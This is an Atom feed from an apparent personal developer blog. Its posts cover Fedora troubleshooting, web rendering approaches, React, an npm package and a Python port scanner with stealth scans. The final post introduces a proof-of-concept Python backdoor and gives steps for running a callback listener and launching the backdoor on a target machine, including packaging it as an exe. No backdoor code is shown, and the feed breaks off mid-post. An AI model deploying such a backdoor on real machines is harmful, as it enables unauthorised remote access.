<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-07-04T04:52:50+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Adrian Ducao</title><subtitle>An Open Source Blog</subtitle><entry><title type="html">Fedora: The myth of stable distribution</title><link href="http://localhost:4000/blog/2021/07/03/Fedora-the-myth-of-stable-distribution.html" rel="alternate" type="text/html" title="Fedora: The myth of stable distribution" /><published>2021-07-03T00:00:00+08:00</published><updated>2021-07-03T00:00:00+08:00</updated><id>http://localhost:4000/blog/2021/07/03/Fedora-the-myth-of-stable-distribution</id><content type="html" xml:base="http://localhost:4000/blog/2021/07/03/Fedora-the-myth-of-stable-distribution.html">&lt;h1 id=&quot;stability-fedora-distro&quot;&gt;Stability Fedora Distro&lt;/h1&gt;
&lt;p&gt;Fedora OS is one of many distribution of linux kernel by far this is the most stable OS i’ve used, in Ubuntu this typically breaks after 3-4 months of usage and updates, Pop_OS actually lasted 6-7 months before breaking, but Fedora lasted me almost 2 years before breaking on me, the reason why fedora is stable is due to the huge support of developers who maintain the kernel and is backed by redhat which you’ll get a steady updates is providing bleeding edge technology and since Fedora has one of the largest community most if not all issues has been addressed, reported, or experienced everysingle kind of breaks to be able to provide solutions, and since Fedora is following the spirit of software freedom and open source philosophy which makes them actively refuse to include proprietary programs and would rather prefer open sourced software instead.&lt;/p&gt;

&lt;h1 id=&quot;issue-and-troubleshooting&quot;&gt;Issue and Troubleshooting&lt;/h1&gt;
&lt;p&gt;The issue that i encounter the most when in comes with linux distro is the kernel update there are times that things might truly break reason may vary, there’s alot of variable to consider such as hardware compatibility, broken dependency repositories, and other unknown sh*ts.&lt;/p&gt;

&lt;p&gt;After the update from Fedora 33 to Fedora 34 everything seems fine or issue, 2 months after the system upgrade i noticed a sluggish load time of my computer, my bootdrive is encrypted so whenever computer boots up you need to enter the passphrase, typical it will only take less than 5 seconds to load and you’ll be directed to login asking for password… but this time the load time after passphrase input took 1-3 minutes… a noticable difference… i worried that my M.2 SSD is dying but that’s not the issue since after a day or two boot stucked at&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;....
[OK] starting GNOME display manager

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;then i know somethings up, pressed&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ctrl+Alt+F2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;in order for me to access tty2 so i can at least access a terminal and voala! at last i was able to login on a terminal to check things up… tried to&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo dnf update
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;if something broke last update then this might resolve said issue and remove the potential broken dependencies and fix the bootup issue… but there’s an Error on downloading packages it seemed that i’m not connected to the internet even though my Ethernet is plugged in on my machine…&lt;/p&gt;

&lt;p&gt;tried to&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ping google.com
ping: google.com: Name or service not known
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At first i tought that the motherboard might have some issue but then i remembered that i have my network manager set to automatically connect to my VPN when connecting to the internet not sure why my system can’t connect to my VPN server i tried to&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nm-connection-editor
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;but it won’t pull up since there’s no GUI, took me a while to do research and realized that i can use nmcli…
Checking ethernet adapters with&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nmcli con
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;i was able to confirm that ethernet is not connected and had to&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nmcli con add ethernet
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;to test if i was able to connect to the internet&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ping google.com
PING google.com (142.250.66.142) 56(84) bytes of data.
_
--- google.com ping statistics ---
5 packets transmitted, 0 received, 100% packet loss, time 4134ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;it seemed connected but with a 100% packet loss is useless… but tried to test it anyway by running an update&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo dnf update
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;the update went through and rebooted my machine… but still getting the same issue on boot and the load time is much worse since it’s taking at least 4-5 minutes…&lt;/p&gt;

&lt;p&gt;Tried to check the update history to see if i can revert back some of the updates done&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo dnf history --reverse

...showed the update and installation history...

$ sudo dnf history undo &amp;lt;id&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;but after several tries and restarts things not getting better, still the same issue…&lt;/p&gt;

&lt;p&gt;The only thing that i could think off is to revert or downgrade the current version of my distro to Fedora 33&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo dnf system-upgrade download  --releasever=33 --allowerasing --skip-broken
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;finalising the downgrade&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo dnf system-upgrade reboot
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;i encountered another issue stating that there’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;missing shared file Libip4tc.so.2&lt;/code&gt;
after much research and digging about this error found couple unanswered and unresolved queries in StackOverflow and some fedora forums i fanally decided to give up.&lt;/p&gt;

&lt;h1 id=&quot;solution&quot;&gt;Solution&lt;/h1&gt;
&lt;p&gt;Logged in to my cherrypi-server and created a bootable Fedora 34 flash drive out of the iso file downloaded from their website and installed a fresh Fedora 34 on my M.2 SSD boot drive… all files important data are archived to seperate 2TB HDD, 1 TB HDD, and Projects files are safe and sound on my 250GB SSD.&lt;/p&gt;

&lt;h1 id=&quot;theory&quot;&gt;Theory&lt;/h1&gt;
&lt;p&gt;after much discussion in a fedora forum they asked if i could boot to the other kernel saved up since whenver there’s an kernel update the older kernel are set aside and saved as a backup use incase the latest kernel had an issue, in total there are 3 different kernel versions on your bootdrive ready to be used but i did try to use 3 of those kernel version and still got the same issue at the end, Kernel Version are 5.13.xx, 5.12.xx, and 5.11.xx, i could have troubled to use download older kernel versions compile it and install but it would be much safer to install a fresh copy for security reasons, we concluded that there might be an update that broke the kernel version since Fedora 34 was just release back on April 2021, it is farely new and this point&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;If ain’t broke don’t fix it, if it breaks and can’t be fixed replace it.&lt;/p&gt;

&lt;p&gt;Happy Coding.&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">Stability Fedora Distro Fedora OS is one of many distribution of linux kernel by far this is the most stable OS i’ve used, in Ubuntu this typically breaks after 3-4 months of usage and updates, Pop_OS actually lasted 6-7 months before breaking, but Fedora lasted me almost 2 years before breaking on me, the reason why fedora is stable is due to the huge support of developers who maintain the kernel and is backed by redhat which you’ll get a steady updates is providing bleeding edge technology and since Fedora has one of the largest community most if not all issues has been addressed, reported, or experienced everysingle kind of breaks to be able to provide solutions, and since Fedora is following the spirit of software freedom and open source philosophy which makes them actively refuse to include proprietary programs and would rather prefer open sourced software instead.</summary></entry><entry><title type="html">New Website as Porfolio</title><link href="http://localhost:4000/blog/2021/06/18/New-Website-as-portfolio.html" rel="alternate" type="text/html" title="New Website as Porfolio" /><published>2021-06-18T06:00:00+08:00</published><updated>2021-06-18T06:00:00+08:00</updated><id>http://localhost:4000/blog/2021/06/18/New-Website-as-portfolio</id><content type="html" xml:base="http://localhost:4000/blog/2021/06/18/New-Website-as-portfolio.html">&lt;h1 id=&quot;new-website-as-porfolio&quot;&gt;New Website as Porfolio&lt;/h1&gt;
&lt;p&gt;will dev and deploy a new website &lt;a href=&quot;https://adrianducao.ph&quot;&gt;adrianducao.ph&lt;/a&gt; to showcase my projects and passion on web development and programming… basically a requirement too for some companies and client…&lt;/p&gt;

&lt;p&gt;Happy Coding.&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">New Website as Porfolio will dev and deploy a new website adrianducao.ph to showcase my projects and passion on web development and programming… basically a requirement too for some companies and client…</summary></entry><entry><title type="html">Server Side Rendering vs. Client Side Rendering</title><link href="http://localhost:4000/blog/2021/06/16/ServerSideRendering-vs.-ClientSideRendering.html" rel="alternate" type="text/html" title="Server Side Rendering vs. Client Side Rendering" /><published>2021-06-16T06:00:00+08:00</published><updated>2021-06-16T06:00:00+08:00</updated><id>http://localhost:4000/blog/2021/06/16/ServerSideRendering-vs.-ClientSideRendering</id><content type="html" xml:base="http://localhost:4000/blog/2021/06/16/ServerSideRendering-vs.-ClientSideRendering.html">&lt;blockquote&gt;
  &lt;p&gt;Updated 06/17/2021&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;which-is-better&quot;&gt;Which is better?&lt;/h1&gt;
&lt;p&gt;When it comes with new technology and and fad of web development overall is flawed some promoting this and that but most of the recommendation found in some cases are not that great, explanation barely understood and just like this post it’s TLDR for some… This is a closer look to the concept, frameworks, and use cases for someone who stared learning with React.js and Node.js on January 2020 and after a year of learning, research, development and deployment here’s some useful insight.&lt;/p&gt;

&lt;h2 id=&quot;server-side-rendering&quot;&gt;Server Side Rendering&lt;/h2&gt;
&lt;p&gt;What is it? this is the traditional way of running things for websites, basically the server will provide readily available files like &lt;a href=&quot;https://www.w3schools.com/html/default.asp&quot;&gt;HTML&lt;/a&gt; and &lt;a href=&quot;https://www.w3schools.com/css/&quot;&gt;CSS&lt;/a&gt; and static files like images will be served and browser will render said files but is not interactive then browser downloads &lt;a href=&quot;https://www.w3schools.com/js/&quot;&gt;JavaScript&lt;/a&gt; then browser executes it to make it interactive… this applies to most websites or landing pages mainly showing some information of a business or personal blogs with no real purpose or data… and in order to see changes on the site the website needs to be refreshed for a new request to be initiated.&lt;/p&gt;
&lt;h4 id=&quot;dynamic-server-side-rendering&quot;&gt;Dynamic Server Side Rendering&lt;/h4&gt;
&lt;p&gt;Web Applications or Web App are DSSR and it’s like SSR but with data, basically the client send request to the server server renders and respond with the static files but the difference is DSSR contains data from a database. Aside from static files this is stacked with &lt;a href=&quot;https://www.php.net/&quot;&gt;PHP&lt;/a&gt; and databases like &lt;a href=&quot;https://www.mysql.com/&quot;&gt;MySQL&lt;/a&gt; or &lt;a href=&quot;https://www.mongodb.com/&quot;&gt;mongoDB&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;client-side-rendering&quot;&gt;Client Side Rendering&lt;/h2&gt;
&lt;p&gt;The concept of client side rendering is not new, but is mainly popularized with the use of front-end frameworks such as &lt;a href=&quot;https://reactjs.org/&quot;&gt;React.js&lt;/a&gt; released on 2013 the concept of redefining web development and deviding it into 2 parts front-end developement for the overall face or aesthetic and back-end developement of functionality, this concept lessens the burden of developers so they can just specialised in one thing and not to worry about the next, this provides some innovation and breath of fresh air on designs. Development with client side rendering concept comes with a framework or library and if you have any background of javascript that would come in handy but React has it’s own syntax so checkout the &lt;a href=&quot;https://reactjs.org/docs/getting-started.html&quot;&gt;Docu&lt;/a&gt;. I also wrote a post about &lt;a href=&quot;https://adrianducao.github.io/coding/2020/10/02/Thoughts-on-React.js-copy.html&quot;&gt;React.js&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;microservices&quot;&gt;Microservices&lt;/h3&gt;
&lt;p&gt;Another concept that would come in mind if you devide the front-end to the back-end is microservices, what is microservices? from the name itself it is a way to distribute or spreading the work load of a web app, basically you can use a robust websever and high performance load balancer like &lt;a href=&quot;https://www.nginx.com/&quot;&gt;NGINX&lt;/a&gt; and is mainly used as a reverse proxy. This way you could put mongoDB on a &lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; container and run as it is seperated from Node.js back-end server to provide API and is also seperated from front-end. Microservices also comes in handy for big Projects like serving hundreds and thousands or millions of users with the only bottleneck is the clients internet speed, good example is &lt;a href=&quot;https://www.youtube.com/watch?v=CZ3wIuvmHeM&quot;&gt;Netflix’s Microservices&lt;/a&gt;. a thing to remember and take note is that overdoing things will comes with a price of undocumented shit, so bare in mind that there are some use cases of microservices especially for big projects that handles a lot of work load but if you only run a blog site with no forums or any services whatsover please don’t use this concept…&lt;/p&gt;

&lt;h2 id=&quot;stacks-things-ive-used-before&quot;&gt;Stacks: Things i’ve used before&lt;/h2&gt;
&lt;p&gt;what are the common stack that you see in SSR?&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;HTML&lt;/li&gt;
  &lt;li&gt;CSS/Bootstrap&lt;/li&gt;
  &lt;li&gt;JavaScript&lt;/li&gt;
  &lt;li&gt;and a Web server like &lt;a href=&quot;https://www.apache.org/&quot;&gt;Apache&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;MENN Stack(MongoDB Express &lt;a href=&quot;https://nextjs.org/docs/getting-started&quot;&gt;Next.js&lt;/a&gt; Node.js)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;what about for DSSR?&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;same thing but with PHP and Databases like MySQL or PostgreSQL&lt;/li&gt;
  &lt;li&gt;and Servers like Apache, &lt;a href=&quot;https://www.wampserver.com/en/&quot;&gt;WAMPP&lt;/a&gt;, &lt;a href=&quot;https://www.apachefriends.org/index.html&quot;&gt;XAMPP&lt;/a&gt;, or &lt;a href=&quot;https://laragon.org/&quot;&gt;Laragon&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;MENN Stack or (MEAN Stack but i haven’t used this… A is &lt;a href=&quot;https://angular.io/docs&quot;&gt;Angular&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;what about stacks for CSR?&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://reactjs.org/&quot;&gt;React.js&lt;/a&gt; Framework&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nodejs.org/en/&quot;&gt;Node.js&lt;/a&gt; and will use &lt;a href=&quot;https://expressjs.com/&quot;&gt;Express.js&lt;/a&gt; Framwork&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.nginx.com/&quot;&gt;NGINX&lt;/a&gt; for the server and reverse proxy&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.mongodb.com/&quot;&gt;MongoDB&lt;/a&gt;
they usually call this MERN Stack (Mongo Express Reat Node) but you could also use MySQL or PostgreSQL on this so call it PERN Stack :-)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;with Microservices&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.docker.com/&quot;&gt;Docker&lt;/a&gt;
i mainly use docker since i haven’t got the time to read the &lt;a href=&quot;https://kubernetes.io/&quot;&gt;Kubernetes&lt;/a&gt; Documentation but they say that it’s much easier to pair docker with kubernetes since you can use kubernetes to manage docker containers afterwards&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;So after using this client side rendering concepts and stacks for about a year, i found out that:&lt;/p&gt;
&lt;h3 id=&quot;best-use-cases-for-ssr-and-dssr&quot;&gt;best use cases for SSR and DSSR&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Landing page or websites that doesn’t require any data input and outputs&lt;/li&gt;
  &lt;li&gt;Blogs and Forums&lt;/li&gt;
  &lt;li&gt;Web Apps that requires good compatibility with SEO&lt;/li&gt;
  &lt;li&gt;Load Time&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;best-use-cases-for-csr&quot;&gt;best use cases for CSR&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Web Apps that doesn’t care about SEO, good examples are web apps used on business end&lt;/li&gt;
  &lt;li&gt;Load Time (Client will have bad experience if slow internet connection is involved)&lt;/li&gt;
  &lt;li&gt;No full page reload, as the only thing that needs to load is the API’s data&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Happy Coding.&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">Updated 06/17/2021</summary></entry><entry><title type="html">Port Scanning Tool: finding-PORTy</title><link href="http://localhost:4000/coding/2021/06/10/Port-scanning-tool.html" rel="alternate" type="text/html" title="Port Scanning Tool: finding-PORTy" /><published>2021-06-10T06:00:00+08:00</published><updated>2021-06-10T06:00:00+08:00</updated><id>http://localhost:4000/coding/2021/06/10/Port-scanning-tool</id><content type="html" xml:base="http://localhost:4000/coding/2021/06/10/Port-scanning-tool.html">&lt;h1 id=&quot;what-is-it&quot;&gt;What is it?&lt;/h1&gt;
&lt;p&gt;finding-PORTy is a proof of concept fully functional port scanning tool designed to check open ports, check live host in a network, stealth scans, and keep activity data for later use. I wrote it on Python 3 so the codebase is supposed to be easily understandable and modified for further use.&lt;/p&gt;

&lt;p&gt;here’s what it looks like&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    |&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;   o
    |  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;   o
|&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/    .&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;o
| |       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;======[&lt;/span&gt;finding-PORTy v1.]&lt;span class=&quot;o&quot;&gt;======&lt;/span&gt;
|/ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;    /
    |  /
     |/
                    


&lt;span class=&quot;o&quot;&gt;===[&lt;/span&gt;OPTIONS]&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; 
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] Scan Open Ports 
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] Ping Sweep Live Host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Loud&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] TCP Scan &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Stealth&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4] Show Activities 
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;5] Remove History
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0] Exit
Action: 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;whats-the-souce&quot;&gt;What’s the Souce?&lt;/h1&gt;
&lt;p&gt;souce: &lt;a href=&quot;https://github.com/AdrianDucao/finding-PORTy&quot;&gt;https://github.com/AdrianDucao/finding-PORTy&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Learning curve is a minor setback with &lt;a href=&quot;https://docs.python.org/3/library/socket.html?highlight=socket#module-socket&quot;&gt;Socket Module&lt;/a&gt;, read Python 3 Documentations &lt;a href=&quot;https://docs.python.org/3/library/os.html?highlight=os#module-os&quot;&gt;OS Documentation&lt;/a&gt;, &lt;a href=&quot;https://docs.python.org/3/library/csv.html?highlight=csv&quot;&gt;CSV documentation&lt;/a&gt;, the &lt;a href=&quot;https://www.tutorialspoint.com/python3/python_networking.htm&quot;&gt;python3 network programming&lt;/a&gt;, and some stack overflow for errors really helped.&lt;/p&gt;

&lt;p&gt;Happy Coding.&lt;/p&gt;</content><author><name></name></author><category term="coding" /><summary type="html">What is it? finding-PORTy is a proof of concept fully functional port scanning tool designed to check open ports, check live host in a network, stealth scans, and keep activity data for later use. I wrote it on Python 3 so the codebase is supposed to be easily understandable and modified for further use.</summary></entry><entry><title type="html">Thoughts on React.js</title><link href="http://localhost:4000/coding/2020/10/03/Thoughts-on-React.js-copy.html" rel="alternate" type="text/html" title="Thoughts on React.js" /><published>2020-10-03T06:00:00+08:00</published><updated>2020-10-03T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/10/03/Thoughts-on-React.js%20copy</id><content type="html" xml:base="http://localhost:4000/coding/2020/10/03/Thoughts-on-React.js-copy.html">&lt;h1 id=&quot;for-starters&quot;&gt;For starters&lt;/h1&gt;
&lt;p&gt;React.js is a javascript library for building front-end UI and components, it’s mainly used by front-end developers and full stack developers for static sites, web apps, and mobile apps. The competition is mainly Angular and Vue.js on web and mobile framework.&lt;/p&gt;

&lt;p&gt;I tried using the react and experiment with it last early months of 2020 but I’ve decided to take a look at it last September of 2020 to better understand the framework, I did quite a lot of googling and watched youtube videos to understand the basics of the syntax, there’s no easy way to learn a framework but to read the documentation and from there i understand that you are still using some HTML tags, using CSS to design stuff, and still using the normal JavaScript, so basically your generating a static HTML file with javascript.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public directory - contains the static HTML file and images or videos you want to use.
src directory - contains the source file, components, and pages of your static site.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;the-point&quot;&gt;The Point&lt;/h1&gt;
&lt;p&gt;Most developers will tell you that React.js offers reusable components, however with stock HTML5, CSS3, and JavaScript you can also create a reusable components. The thing is you’re still designing some of that components with CSS, probably the point is to save time, you can argue that you can write all those by your self but if you are in a deadline, it’s better to shave minutes or hours to meet that said deadline.&lt;/p&gt;

&lt;p&gt;Performance, is one of the main reason developers use React, so how does it work? the way stock HTML, CSS, and JavaScript work goes something like this; you enter the website, the html, css and js stack loads, and if you go a different pages that said stack will reload everytime you go to different pages of that site. React.js works like this, you enter the site, the static file such as HTML, CSS, and JS is downloaded at once if not incrementally being downloaded to your browser, and whenever you go to a different page the only thing being refreshed or re-rendered is the content or the API. that’s why React.js is a client side application.&lt;/p&gt;

&lt;h1 id=&quot;cons&quot;&gt;Cons&lt;/h1&gt;
&lt;p&gt;The only Cons to these web framworks are the hyped up nature of it and the fact of FOMO(Fear Of Missing Out) this pushes developers to learn new framework because it is hot and hyped up, and may lead developers to Burn Out.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Learning curve is a minor setback, you are living in 21st Century different information, tutorials, documentations and overall human knowledge is available on the internet, anything can be learned. React.js is a pretty good front-end framework, in order to complete a full stack project you have to use a different framework and runtime to finish the back-end you can use Node.js and Express.js web framework for your REST API, even better if you add GraphQL on the mix. This industry is changing month by month and it’s up to you to catch up and learn.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/AdrianDucao/devlog&quot;&gt;Sample Code&lt;/a&gt;
&lt;a href=&quot;https://www.youtube.com/c/AMACTechtipsPhilippines/videos?view_as=subscriber&quot;&gt;Dev Vlog&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Happy Coding.&lt;/p&gt;</content><author><name></name></author><category term="coding" /><summary type="html">For starters React.js is a javascript library for building front-end UI and components, it’s mainly used by front-end developers and full stack developers for static sites, web apps, and mobile apps. The competition is mainly Angular and Vue.js on web and mobile framework.</summary></entry><entry><title type="html">Published an NPM Package</title><link href="http://localhost:4000/coding/2020/09/11/Published-an-NPM-package-copy.html" rel="alternate" type="text/html" title="Published an NPM Package" /><published>2020-09-11T06:00:00+08:00</published><updated>2020-09-11T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/09/11/Published-an-NPM-package%20copy</id><content type="html" xml:base="http://localhost:4000/coding/2020/09/11/Published-an-NPM-package-copy.html">&lt;h3 id=&quot;issue&quot;&gt;Issue:&lt;/h3&gt;
&lt;p&gt;I’ve been trying to figure out on how to use sessionStorage in node.js, it’s true that you should not use these on projects but there are some useful use case of these, so i decided to create one and published it as npm package for others to use if they need it.&lt;/p&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution:&lt;/h3&gt;
&lt;p&gt;installation:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    npm i sessionstorage-for-nodejs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;usage:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nodejs&quot;&gt;    const sessionStorage = require(&apos;sessionstorage-for-node&apos;);
    
    sessionStorage.setItem(&apos;id&apos;, &apos;value&apos;);
    
    console.log(&apos;product: &apos;, sessionStorage.getItem(&apos;foo&apos;));
    
    sessionStorage.removeItem(&apos;id&apos;, &apos;value&apos;);

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources:&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/AdrianDucao/sessionStorage-for-node&quot;&gt;Github Repo&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.npmjs.com/package/sessionstorage-for-nodejs&quot;&gt;NPM Package&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Happy Coding.&lt;/p&gt;</content><author><name></name></author><category term="coding" /><summary type="html">Issue: I’ve been trying to figure out on how to use sessionStorage in node.js, it’s true that you should not use these on projects but there are some useful use case of these, so i decided to create one and published it as npm package for others to use if they need it.</summary></entry><entry><title type="html">Proof of Concept Python Backdoor</title><link href="http://localhost:4000/coding/2020/09/11/Proof-of-Concept-Python-Backdoor-copy.html" rel="alternate" type="text/html" title="Proof of Concept Python Backdoor" /><published>2020-09-11T06:00:00+08:00</published><updated>2020-09-11T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/09/11/Proof-of-Concept-Python-Backdoor%20copy</id><content type="html" xml:base="http://localhost:4000/coding/2020/09/11/Proof-of-Concept-Python-Backdoor-copy.html">&lt;h1 id=&quot;goatse&quot;&gt;goatse&lt;/h1&gt;
&lt;p&gt;a proof of concept backdoor for the most bare-bone access&lt;/p&gt;

&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;/h2&gt;
&lt;p&gt;Run the server.py on your computer to start listening for callbacks.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo chmod &lt;/span&gt;775 server.py
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./server.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;3 ways you can start goatse to target computer&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;run as python script
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo chmod &lt;/span&gt;775 goatse.py
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./goatse.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;create an exe file using pyinstaller, exe file is located in dist folder
